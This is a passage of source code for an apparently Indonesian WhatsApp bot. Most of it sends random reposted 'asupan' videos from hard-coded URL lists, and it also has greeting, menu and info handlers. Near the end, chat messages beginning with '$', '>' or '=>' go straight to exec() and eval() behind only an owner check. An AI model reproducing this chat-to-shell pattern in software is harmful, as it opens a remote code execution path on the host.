    var viona = ['https://h.top4top.io/m_2045fs1b71.mp4', 'https://g.top4top.io/m_20453m4y71.mp4', 'https://g.top4top.io/m_2045mgrc01.mp4', 'https://f.top4top.io/m_2045p29p01.mp4', 'https://l.top4top.io/m_2045ity101.mp4', 'https://i.top4top.io/m_2045kguyy1.mp4', 'https://a.top4top.io/m_204549ynr1.mp4', 'https://b.top4top.io/m_2045y0fty1.mp4', 'https://c.top4top.io/m_20456si0m1.mp4', 'https://f.top4top.io/m_20457pmms1.mp4', 'https://h.top4top.io/m_2045gtquo1.mp4', 'https://j.top4top.io/m_204568o961.mp4', 'https://a.top4top.io/m_2045jqw861.mp4', 'https://d.top4top.io/m_2045frb0x1.mp4', 'https://c.top4top.io/m_2045xzr2v1.mp4', 'https://b.top4top.io/m_2045ae34n1.mp4', 'https://h.top4top.io/m_20453a5r81.mp4', 'https://k.top4top.io/m_2045baiy41.mp4', 'https://g.top4top.io/m_2045fjj6h1.mp4', 'https://i.top4top.io/m_2045q3tba1.mp4', 'https://d.top4top.io/m_2045npd2v1.mp4', 'https://e.top4top.io/m_2045fw9tg1.mp4', 'https://e.top4top.io/m_2045g0bgt1.mp4', 'https://k.top4top.io/m_2045opgb71.mp4'];
    var random_viona = viona[Math.floor(Math.random() * (viona.length))];
    let ini_viona = await getBuffer(random_viona);
    xdev.sendMessage(from, ini_viona, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syania') {
    setReply(mess.wait);
    var syania = ['https://f.top4top.io/m_2045x5wnd1.mp4', 'https://e.top4top.io/m_2045zv8zg1.mp4', 'https://d.top4top.io/m_2045trg5i1.mp4', 'https://c.top4top.io/m_2045xbfb51.mp4', 'https://h.top4top.io/m_2045dblc31.mp4', 'https://a.top4top.io/m_2045xd5sx1.mp4', 'https://k.top4top.io/m_2045520uv1.mp4', 'https://j.top4top.io/m_2045bplb41.mp4', 'https://i.top4top.io/m_2045x91991.mp4', 'https://l.top4top.io/m_2045jr6gs1.mp4', 'https://g.top4top.io/m_2045i9xs01.mp4', 'https://e.top4top.io/m_2045ideve1.mp4', 'https://f.top4top.io/m_2045g992t1.mp4', 'https://d.top4top.io/m_2045m180v1.mp4', 'https://c.top4top.io/m_2045n6bm31.mp4', 'https://b.top4top.io/m_2045s5r3z1.mp4', 'https://i.top4top.io/m_2045xoitc1.mp4', 'https://k.top4top.io/m_2045dur3t1.mp4', 'https://d.top4top.io/m_2045c6ddy1.mp4', 'https://j.top4top.io/m_2045nbbuc1.mp4', 'https://g.top4top.io/m_2045yinwy1.mp4', 'https://a.top4top.io/m_2045qsqhq1.mp4', 'https://c.top4top.io/m_20453tu1v1.mp4', 'https://e.top4top.io/m_2045zjbk31.mp4', 'https://f.top4top.io/m_2045n4rmz1.mp4', 'https://h.top4top.io/m_2045reqfb1.mp4', 'https://a.top4top.io/m_2045i86q21.mp4', 'https://b.top4top.io/m_20453xada1.mp4'];
    var random_syania = syania[Math.floor(Math.random() * (syania.length))];
    let ini_syania = await getBuffer(random_syania);
    xdev.sendMessage(from, ini_syania, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'riri') {
    setReply(mess.wait);
    var riri = ['https://e.top4top.io/m_2045ut0en1.mp4', 'https://d.top4top.io/m_2045a5q5l1.mp4', 'https://f.top4top.io/m_2045rd0z31.mp4', 'https://c.top4top.io/m_2045zm4xy1.mp4', 'https://b.top4top.io/m_2045n6guq1.mp4', 'https://l.top4top.io/m_2045v8ck61.mp4', 'https://a.top4top.io/m_2045jbwwh1.mp4', 'https://k.top4top.io/m_2045ndl5m1.mp4', 'https://j.top4top.io/m_20457v6t61.mp4', 'https://i.top4top.io/m_2045a3gre1.mp4', 'https://h.top4top.io/m_2045tli2k1.mp4', 'https://g.top4top.io/m_2045z1u2g1.mp4', 'https://f.top4top.io/m_2045kdv2f1.mp4', 'https://e.top4top.io/m_20458qzhw1.mp4', 'https://d.top4top.io/m_20459vq7t1.mp4', 'https://c.top4top.io/m_20452b3av1.mp4', 'https://b.top4top.io/m_2045u5z3p1.mp4', 'https://a.top4top.io/m_2045l6nrb1.mp4'];
    var random_riri = riri[Math.floor(Math.random() * (riri.length))];
    let ini_riri = await getBuffer(random_riri);
    xdev.sendMessage(from, ini_riri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'syifa') {
    setReply(mess.wait);
    var syifa = ['https://h.top4top.io/m_2044bbyhm1.mp4', 'https://l.top4top.io/m_2044xa3nk1.mp4', 'https://j.top4top.io/m_20446ggxu1.mp4', 'https://d.top4top.io/m_2044rvctf1.mp4', 'https://b.top4top.io/m_2044kdgfw1.mp4', 'https://k.top4top.io/m_204432xwq1.mp4', 'https://c.top4top.io/m_204456vl01.mp4', 'https://a.top4top.io/m_2044bz2nv1.mp4', 'https://i.top4top.io/m_20440vzg41.mp4', 'https://e.top4top.io/m_20446qugg1.mp4', 'https://g.top4top.io/m_2044xrism1.mp4', 'https://c.top4top.io/m_20449iqt51.mp4', 'https://a.top4top.io/m_2044h64w01.mp4', 'https://d.top4top.io/m_20445mytg1.mp4', 'https://g.top4top.io/m_20445g4ue1.mp4', 'https://i.top4top.io/m_2044l1yk41.mp4', 'https://c.top4top.io/m_2044vpzyb1.mp4', 'https://e.top4top.io/m_20445z0xd1.mp4', 'https://d.top4top.io/m_2044qjas41.mp4', 'https://b.top4top.io/m_2044irvk41.mp4', 'https://l.top4top.io/m_2044wmw5d1.mp4', 'https://k.top4top.io/m_2044jewbq1.mp4', 'https://j.top4top.io/m_2044lo9sv1.mp4', 'https://i.top4top.io/m_2044fq2ne1.mp4', 'https://h.top4top.io/m_2044wudwv1.mp4', 'https://f.top4top.io/m_20445frga1.mp4'];
    var random_syifa = syifa[Math.floor(Math.random() * (syifa.length))];
    let ini_syifa = await getBuffer(random_syifa);
    xdev.sendMessage(from, ini_syifa, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mama_gina') {
    setReply(mess.wait);
    var mama_gina = ['https://j.top4top.io/m_2044moqoh1.mp4', 'https://a.top4top.io/m_2044kfu031.mp4', 'https://e.top4top.io/m_2044pd4q61.mp4', 'https://b.top4top.io/m_2044hd3hd1.mp4', 'https://k.top4top.io/m_2044lw3oq1.mp4', 'https://g.top4top.io/m_2044iu82p1.mp4', 'https://g.top4top.io/m_2044b4orc1.mp4', 'https://c.top4top.io/m_2044no8dz1.mp4', 'https://i.top4top.io/m_2044pxagw1.mp4', 'https://b.top4top.io/m_2044z2w4t1.mp4', 'https://c.top4top.io/m_2044lcxpj1.mp4', 'https://d.top4top.io/m_2044nvuaw1.mp4', 'https://f.top4top.io/m_20440g0o31.mp4', 'https://k.top4top.io/m_2044v2ime1.mp4', 'https://h.top4top.io/m_2044awwxm1.mp4', 'https://d.top4top.io/m_2044ht3vj1.mp4', 'https://l.top4top.io/m_2044bw2d31.mp4', 'https://i.top4top.io/m_2044zuzja1.mp4', 'https://l.top4top.io/m_2044cogw61.mp4', 'https://h.top4top.io/m_2044jasn31.mp4', 'https://j.top4top.io/m_204473eed1.mp4', 'https://a.top4top.io/m_20445wkpp1.mp4'];
    var random_mama_gina = mama_gina[Math.floor(Math.random() * (mama_gina.length))];
    let ini_mama_gina = await getBuffer(random_mama_gina);
    xdev.sendMessage(from, ini_mama_gina, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'alcakenya') {
    setReply(mess.wait);
    var alcakenya = ['https://l.top4top.io/m_2044ehtwa1.mp4', 'https://k.top4top.io/m_2044h7tpc1.mp4', 'https://b.top4top.io/m_2044l37zk1.mp4', 'https://i.top4top.io/m_2044e9pqz1.mp4', 'https://j.top4top.io/m_2044obe8d1.mp4', 'https://k.top4top.io/m_2044dh7u21.mp4', 'https://c.top4top.io/m_2044o3ohe1.mp4', 'https://f.top4top.io/m_2044zm90s1.mp4', 'https://d.top4top.io/m_2044v7mo21.mp4', 'https://h.top4top.io/m_20446er9r1.mp4', 'https://g.top4top.io/m_2044o8u9t1.mp4', 'https://a.top4top.io/m_204421sn31.mp4', 'https://b.top4top.io/m_2044khyds1.mp4', 'https://a.top4top.io/m_2044vga111.mp4', 'https://l.top4top.io/m_2044mp7841.mp4', 'https://c.top4top.io/m_2044m3h8m1.mp4', 'https://f.top4top.io/m_2044ek3vd1.mp4', 'https://e.top4top.io/m_20443r9am1.mp4', 'https://d.top4top.io/m_2044g19oc1.mp4', 'https://j.top4top.io/m_20440tis11.mp4', 'https://e.top4top.io/m_2044yimnr1.mp4'];
    var random_alcakenya = alcakenya[Math.floor(Math.random() * (alcakenya.length))];
    let ini_alcakenya = await getBuffer(random_alcakenya);
    xdev.sendMessage(from, ini_alcakenya, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'mangayutri') {
    setReply(mess.wait);
    var mangayutri = ['https://e.top4top.io/m_2044wm1kq1.mp4', 'https://l.top4top.io/m_2044k0psz1.mp4', 'https://c.top4top.io/m_2044y394z1.mp4', 'https://a.top4top.io/m_2044mzst31.mp4', 'https://g.top4top.io/m_2044tq6o11.mp4', 'https://f.top4top.io/m_2044z61tt1.mp4', 'https://d.top4top.io/m_2044t3dn91.mp4', 'https://k.top4top.io/m_20443i8ba1.mp4', 'https://b.top4top.io/m_2044i0ao91.mp4', 'https://l.top4top.io/m_2044dvyeb1.mp4', 'https://h.top4top.io/m_2044d5gey1.mp4', 'https://f.top4top.io/m_204484esr1.mp4', 'https://i.top4top.io/m_2044ez7y91.mp4', 'https://c.top4top.io/m_2044qkb5k1.mp4', 'https://j.top4top.io/m_2044wwdfy1.mp4', 'https://d.top4top.io/m_2044fzmw21.mp4', 'https://g.top4top.io/m_20444rprh1.mp4', 'https://e.top4top.io/m_20446919h1.mp4', 'https://a.top4top.io/m_2044unrp01.mp4', 'https://i.top4top.io/m_20441xktm1.mp4', 'https://h.top4top.io/m_20444t5dj1.mp4', 'https://f.top4top.io/m_2044l4j3r1.mp4', 'https://k.top4top.io/m_2044wb7pq1.mp4', 'https://e.top4top.io/m_2044i5rki1.mp4', 'https://j.top4top.io/m_2044s58ir1.mp4', 'https://g.top4top.io/m_2044dayid1.mp4', 'https://d.top4top.io/m_204492t8n1.mp4'];
    var random_mangayutri = mangayutri[Math.floor(Math.random() * (mangayutri.length))];
    let ini_mangayutri = await getBuffer(random_mangayutri);
    xdev.sendMessage(from, ini_mangayutri, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'rikagusriani') {
    setReply(mess.wait);
    var rikagusriani = ['https://b.top4top.io/m_1930thxw90.mp4', 'https://d.top4top.io/m_1930pezhp0.mp4', 'https://c.top4top.io/m_1930cjgbx0.mp4', 'https://b.top4top.io/m_1930v6vhg0.mp4', 'https://f.top4top.io/m_1930uh7ud0.mp4', 'https://a.top4top.io/m_1930c9cpb0.mp4', 'https://k.top4top.io/m_19308amkf0.mp4', 'https://d.top4top.io/m_1930wjaq60.mp4', 'https://i.top4top.io/m_1930n2um40.mp4', 'https://i.top4top.io/m_1930e14pi0.mp4', 'https://i.top4top.io/m_1930w6lwf0.mp4', 'https://e.top4top.io/m_19307autl0.mp4', 'https://d.top4top.io/m_1930i6tfc0.mp4', 'https://c.top4top.io/m_1930qmr7u0.mp4', 'https://d.top4top.io/m_1930itbte1.mp4', 'https://i.top4top.io/m_1930ze4oq0.mp4', 'https://j.top4top.io/m_1930kkqyh1.mp4', 'https://f.top4top.io/m_1930zevlz0.mp4', 'https://g.top4top.io/m_1930q0apu1.mp4', 'https://h.top4top.io/m_1930trfsv2.mp4'];
    var random_rikagusriani = rikagusriani[Math.floor(Math.random() * (rikagusriani.length))];
    let ini_rikagusriani = await getBuffer(random_rikagusriani);
    xdev.sendMessage(from, ini_rikagusriani, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'asupan') {
    setReply(mess.wait);
    var asupannih = ['http://sansekai.my.id/ptl_repost/120416207_674661289840975_7238538460676645249_n.mp4', 'http://sansekai.my.id/ptl_repost/120443017_225738842307010_1507614018538871668_n.mp4', 'http://sansekai.my.id/ptl_repost/120506710_129730895516659_9090102890235113922_n.mp4', 'http://sansekai.my.id/ptl_repost/120518115_3382156938497131_2702539154432231938_n.mp4', 'http://sansekai.my.id/ptl_repost/120533450_988960268238482_4908300175960396265_n.mp4', 'http://sansekai.my.id/ptl_repost/120554993_913582535835353_7937155730001219945_n.mp4', 'http://sansekai.my.id/ptl_repost/120565745_258483202099028_1831534734126408497_n.mp4', 'http://sansekai.my.id/ptl_repost/120570166_2716242608644571_5562452335611050430_n.mp4', 'http://sansekai.my.id/ptl_repost/120571358_3743879342322868_4731152347084614368_n.mp4', 'http://sansekai.my.id/ptl_repost/120571938_198275171805822_8506241533969509004_n.mp4', 'http://sansekai.my.id/ptl_repost/120573034_128654721967389_1837144340570017830_n.mp4', 'http://sansekai.my.id/ptl_repost/120574217_2707319792866165_3682328392840010261_n.mp4', 'http://sansekai.my.id/ptl_repost/120575986_151816433263092_6600262966520398271_n.mp4', 'http://sansekai.my.id/ptl_repost/120582400_339926344091433_2581248581156693603_n.mp4', 'http://sansekai.my.id/ptl_repost/120583739_1060190921079212_3898520254664507328_n.mp4', 'http://sansekai.my.id/ptl_repost/120587415_638776546998307_3091093882267818607_n.mp4', 'http://sansekai.my.id/ptl_repost/120589771_752670855329266_5064573607465519463_n.mp4', 'http://sansekai.my.id/ptl_repost/120613860_3393110177444352_4287165838359264124_n.mp4', 'http://sansekai.my.id/ptl_repost/120614859_768632723701773_5662521620734316774_n.mp4', 'http://sansekai.my.id/ptl_repost/120615019_149392973357031_6254963333779779708_n.mp4', 'http://sansekai.my.id/ptl_repost/120664457_338629710563119_6615226849280369453_n.mp4', 'http://sansekai.my.id/ptl_repost/120670762_191033325874671_8168246094200167609_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4', 'http://sansekai.my.id/ptl_repost/120707049_337981777304231_3152650741169851669_n.mp4', 'http://sansekai.my.id/ptl_repost/120714412_680680702806959_2149499366562729814_n.mp4', 'http://sansekai.my.id/ptl_repost/120678112_971693299972883_1648826221504742220_n.mp4', 'http://sansekai.my.id/ptl_repost/120682363_1181866688854694_4233466354892721595_n.mp4', 'http://sansekai.my.id/ptl_repost/120698858_1302470566751609_3736999773452225729_n.mp4'];
    var random_asupannih = asupannih[Math.floor(Math.random() * (asupannih.length))];
    let ini_asupannih = await getBuffer(random_asupannih);
    xdev.sendMessage(from, ini_asupannih, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'bocil') {
    setReply(mess.wait);
    var bocil = ['https://b.top4top.io/m_1931yxodg0.mp4', 'https://k.top4top.io/m_193161p380.mp4', 'https://l.top4top.io/m_1931i4g3p1.mp4', 'https://a.top4top.io/m_1931tjlio2.mp4', 'https://g.top4top.io/m_1931z2mc40.mp4', 'https://h.top4top.io/m_1931auyof1.mp4', 'https://i.top4top.io/m_19315hrle2.mp4', 'https://j.top4top.io/m_1931xul5a3.mp4', 'https://l.top4top.io/m_1931o92nr0.mp4', 'https://a.top4top.io/m_1931j1rh21.mp4', 'https://b.top4top.io/m_1931iaqpg2.mp4', 'https://c.top4top.io/m_1931s5zlj3.mp4', 'https://d.top4top.io/m_1931x0g5a4.mp4', 'https://i.top4top.io/m_1931oj76n0.mp4', 'https://j.top4top.io/m_19319gl3d1.mp4', 'https://k.top4top.io/m_1931u52cq2.mp4', 'https://l.top4top.io/m_1931mvgj73.mp4', 'https://a.top4top.io/m_1931u07oz4.mp4', 'https://j.top4top.io/m_1931h1fo60.mp4', 'https://k.top4top.io/m_1931mro3u1.mp4', 'https://l.top4top.io/m_1931kx0ac2.mp4', 'https://a.top4top.io/m_1931g9ezq3.mp4', 'https://b.top4top.io/m_1931plin14.mp4', 'https://c.top4top.io/m_1931aaxri5.mp4', 'https://d.top4top.io/m_1931ijzzn6.mp4', 'https://e.top4top.io/m_1931ugycd7.mp4', 'https://f.top4top.io/m_1931l14nk8.mp4', 'https://g.top4top.io/m_1931crgqt9.mp4'];
    var random_bocil = bocil[Math.floor(Math.random() * (bocil.length))];
    let ini_bocil = await getBuffer(random_bocil);
    xdev.sendMessage(from, ini_bocil, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'geayubi') {
    setReply(mess.wait);
    var geayubi = ['https://l.top4top.io/m_1931ufrul0.mp4', 'https://a.top4top.io/m_1931jbdpk1.mp4', 'https://c.top4top.io/m_1931aj9nm2.mp4', 'https://d.top4top.io/m_1931cnsal3.mp4', 'https://e.top4top.io/m_1931d4kc74.mp4', 'https://f.top4top.io/m_1931bih8q5.mp4', 'https://g.top4top.io/m_1931xx7aa6.mp4', 'https://h.top4top.io/m_1931g3zsq7.mp4', 'https://a.top4top.io/m_1931m74wd0.mp4', 'https://b.top4top.io/m_1931p8tfm1.mp4', 'https://e.top4top.io/m_1931aj8iv0.mp4', 'https://f.top4top.io/m_1931szguy1.mp4', 'https://g.top4top.io/m_1931l73ry2.mp4', 'https://h.top4top.io/m_1931yhznj3.mp4', 'https://i.top4top.io/m_1931kmtp34.mp4', 'https://j.top4top.io/m_1931snhdg5.mp4', 'https://k.top4top.io/m_1931ay1jz6.mp4', 'https://l.top4top.io/m_1931x70mk7.mp4', 'https://a.top4top.io/m_19319mvvf8.mp4', 'https://b.top4top.io/m_1931icmzd9.mp4', 'https://h.top4top.io/m_19316oo0s0.mp4', 'https://i.top4top.io/m_1931cvvpt1.mp4'];
    var random_geayubi = geayubi[Math.floor(Math.random() * (geayubi.length))];
    let ini_geayubi = await getBuffer(random_geayubi);
    xdev.sendMessage(from, ini_geayubi, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'santuy') {
    setReply(mess.wait);
    var santuy = ['https://e.top4top.io/m_1930wespy0.mp4', 'https://e.top4top.io/m_19303zfi20.mp4', 'https://j.top4top.io/m_1930t00kx0.mp4', 'https://e.top4top.io/m_1930kx7hi0.mp4', 'https://c.top4top.io/m_19307g6kd0.mp4', 'https://f.top4top.io/m_19306yk4c0.mp4', 'https://i.top4top.io/m_1930y1u780.mp4', 'https://j.top4top.io/m_1930ilsyy0.mp4', 'https://i.top4top.io/m_19301948b0.mp4', 'https://d.top4top.io/m_1930zg8460.mp4', 'https://i.top4top.io/m_19301yozl0.mp4', 'https://g.top4top.io/m_1930qjr2q0.mp4', 'https://l.top4top.io/m_1930x1wp50.mp4', 'https://a.top4top.io/m_1930zr1041.mp4', 'https://b.top4top.io/m_1930s29hq2.mp4', 'https://a.top4top.io/m_1930kbo0y0.mp4', 'https://j.top4top.io/m_1930xek9z0.mp4', 'https://i.top4top.io/m_1930s7gb80.mp4', 'https://c.top4top.io/m_1930w0dbu0.mp4', 'https://d.top4top.io/m_1930xu4kd1.mp4', 'https://a.top4top.io/m_1930zw2nb0.mp4', 'https://b.top4top.io/m_1930eybjj1.mp4', 'https://g.top4top.io/m_1930fmx330.mp4', 'https://l.top4top.io/m_1930gnlam0.mp4', 'https://g.top4top.io/m_1930twwu50.mp4', 'https://l.top4top.io/m_1930qkeh70.mp4', 'https://l.top4top.io/m_1930wefm20.mp4', 'https://a.top4top.io/m_1930idzd51.mp4'];
    var random_santuy = santuy[Math.floor(Math.random() * (santuy.length))];
    let ini_santuy = await getBuffer(random_santuy);
    xdev.sendMessage(from, ini_santuy, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
if (responseButton == 'ukhty') {
    setReply(mess.wait);
    var ukhty = ['https://e.top4top.io/m_1930ns2zo0.mp4', 'https://k.top4top.io/m_1930j9i810.mp4', 'https://f.top4top.io/m_1930wtj580.mp4', 'https://d.top4top.io/m_1930a2isv0.mp4', 'https://e.top4top.io/m_1930wbgc41.mp4', 'https://f.top4top.io/m_1930urbj02.mp4', 'https://b.top4top.io/m_1930ceiqv0.mp4', 'https://i.top4top.io/m_1931a0z6o0.mp4', 'https://a.top4top.io/m_193190b500.mp4', 'https://b.top4top.io/m_1931dcixz1.mp4', 'https://g.top4top.io/m_19317gpjp0.mp4', 'https://i.top4top.io/m_1931cc22w1.mp4', 'https://j.top4top.io/m_1931xn6412.mp4', 'https://g.top4top.io/m_1931silxz0.mp4', 'https://h.top4top.io/m_1931as4mg1.mp4', 'https://i.top4top.io/m_1931p9j5v0.mp4', 'https://e.top4top.io/m_1931mgeuy0.mp4', 'https://f.top4top.io/m_1931lw9381.mp4', 'https://g.top4top.io/m_1931vm0dk2.mp4', 'https://h.top4top.io/m_1931fiv8x3.mp4', 'https://b.top4top.io/m_1931jm3dt0.mp4', 'https://e.top4top.io/m_1931i7yag1.mp4', 'https://f.top4top.io/m_1931dr5ya2.mp4', 'https://g.top4top.io/m_193172kpg3.mp4', 'https://h.top4top.io/m_1931j3b224.mp4', 'https://j.top4top.io/m_19317ykt25.mp4', 'https://k.top4top.io/m_1931o0vh16.mp4', 'https://l.top4top.io/m_1931ssfbn7.mp4', 'https://a.top4top.io/m_19318t7458.mp4', 'https://b.top4top.io/m_1931vhu759.mp4'];
    var random_ukhty = ukhty[Math.floor(Math.random() * (ukhty.length))];
    let ini_ukhty = await getBuffer(random_ukhty);
    xdev.sendMessage(from, ini_ukhty, video, {
        mimetype: 'video/mp4',
        quoted: dev,
        caption: `Asupan nih kak`
    })
};
	

	
	
	
	
	//Jika ada yg kirim pesan "p" botz akan respon


				
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(walaikumsalam)
} else if(autosticker) {
sendSticker1(kumsalam)
} else {
setReply("Wa'alaikumssalam kak")
}
}
				
//Jika ada yg kirim pesan "menu" bot akan respon
				if (menu.includes(messagesC)) {
				if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
			    if (isOwner) return 
				setReply(`Hai kak ${pushname} untuk mengakses ketik ${prefix}menu`)
				addSpam("NotCase",senderNumber, "10s", AntiSpam)
				}
				
				
//Jika ada yg toxic botz akan merespon✓

				
//Jika ada yg bilang bot maka botz akan merespon✓
			 if (badud.includes(messagesC)) {
				if (cekSpam("NotCase",senderNumber, AntiSpam)) return
				addSpam("NotCase",senderNumber, "10s", AntiSpam)
                if(autovn ) {
               sendvn(ucapbot)
               } else {
				sendMess(hayuk)
				}
				}
				
	
//Jika ada yg bilang hallo maka botz akan merespon✓

	
	
//******************* 》UCAPAN《 ********************\\
//Jika ada yang bilang ohayo bot akan merespon✓

        
        
        

				
//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(multi) {
 xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah :「  Multi  」`, text, { quoted: setQuoted, contextInfo: forward })
 } else if(prefa){
xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  ${prefa}  」`, text, { quoted: setQuoted, contextInfo: forward })
 } else if(nopref){
 xdev.sendMessage(from, `Baik kak untuk prefix saat ini adalah : 「  No Prefix  」`, text, { quoted: setQuoted, contextInfo: forward })
 }
 }
                   
//Jika ada yang tag nomer owner
                  if (!isOwner && isGroup && budy.includes(nomerOwner)) {
              	if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
                  if (itsMe) return
		          addSpam("NotCase",senderNumber, "10s", AntiSpam)
                  const kta =['?? 🙂','?? 🙂','Oh 🙂']
				  const su = kta[Math.floor(Math.random() * kta.length)]
				  xdev.sendMessage(from, su, text, { quoted: dev })
				   }
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON

	
	
	
	
	
	
	
	
	




if (selectedButton == 'INFO BOTZ') {
if(isExtream) return       
var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
const timestampu = speed();
var total = math(`${groups.length} ${privat.length}`)
const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
					
menunya = info1.bot(calender, wa_version, mcc, mnc, os_version, device_manufacturer, device_model,os,ram2,privat,groups,totalchat,latensi,gender,fake,nomerOwner)
let info = fs.readFileSync('./stik/thumb.jpeg')
options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: fs.readFileSync('./stik/thumb.jpeg'), mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
gbutsan = [{buttonId: `Siap`, buttonText: {displayText: `ᴛᴀɴᴋꜱ`,},type: 1},
{buttonId: `Oke`, buttonText: {displayText: `ᴏᴋᴇ`}, type: 1}]   
if(setmenu === "document") {
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), gbutsan, options2)
} else  {
sendButLocation(from, menunya, `© ${fake1}\n${week} , ${calender}`, fs.readFileSync('./stik/thumb.jpeg'), gbutsan, {contextInfo: forward})             
}




} else if (selectedButton == 'KODE QR') {
if(isExtream) return
sendButMessage(from, `KODE QR YANG TERSEDIA`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}gopay`, buttonText: {displayText: `ɢᴏᴘᴀʏ`,},type: 1},
{buttonId: `${prefix}dana`, buttonText: {displayText: `ᴅᴀɴᴀ`,},type: 1},
{buttonId: `${prefix}ovo`, buttonText: { displayText: `ᴏᴠᴏ`,},type: 1}]);
} else if (selectedButton == 'DEVELOPER') {
if(isExtream) return
} else if (selectedButton == 'YOUTUBE') {
 if(isExtream) return
console.log('YOUTUBE')
xdev.sendMessage(from, `
*BOT WHATSAPP*
wa.me/6285811965686`,
text, {detectLinks: true, quoted: dev})
}




if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
if(budy.startsWith(`${prefix}freeoneday`)){
console.log("freeoneday detected")
} else {
teks = "*Untuk memasukan bot ke group*\n*Kamu harus sewa atau chat owner terlebih dahulu*\n\n" + sewabot.dada(prefix, settings, pushname, ucapanWaktu)
gbutsan = [{buttonId: `${prefix}owner`, buttonText: {displayText: `ᴏᴡɴᴇʀ`}, type: 1}]
sendButLocation(from, teks, `© ${fake1}`, thumb, gbutsan) 
}
}



if (command == prefix + 'bullyu') {
	if(!autoWelcome){
     if(!isWelkom) return setReply("Erro")
     }
     if(isExtream) return
     setReply(`Hayuk ah`)     
      sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
                      {buttonId: `${prefix}${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1}]);
} 



	
	





if (budy.startsWith('$')){
if (!dev.key.fromMe && !isOwner) return onlyOwner()
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return setReply(`@Extream:~ ${err}`)
if (stdout) {
setReply(stdout)
}
})
}

if (budy.startsWith('>')){
if (!dev.key.fromMe && !isOwner) return onlyOwner()
try {
return xdev.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: dev})
} catch(err) {
e = String(err)
setReply(e)
}
}

if (budy.startsWith('=>')){
if (!isOwner && !dev.key.fromMe) return onlyOwner()
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
setReply(String(e))
}
}



    



			




 
          if (timeWib >= '04:00' && timeWib <= '04:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'cyan'))
          }
          if (timeWib >= '05:00' && timeWib <= '05:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Udah sholat Subuh belum kak', 'cyan'))
          }
         if (timeWib >= '06:00' && timeWib <= '06:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Pagi kak, Jangan lupa mandi', 'cyan'))
          }
          if (timeWib >= '11:00' && timeWib <= '11:10') {
          console.log(color(`[${fake}]`, 'gold'), color('Siang kak, Dah mandi blm kak?', 'cyan'))
          }
          if (timeWib >= '12:00' && timeWib <= '12:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'cyan'))
           }
          if (timeWib >= '15:00' && timeWib <= '15:10') {
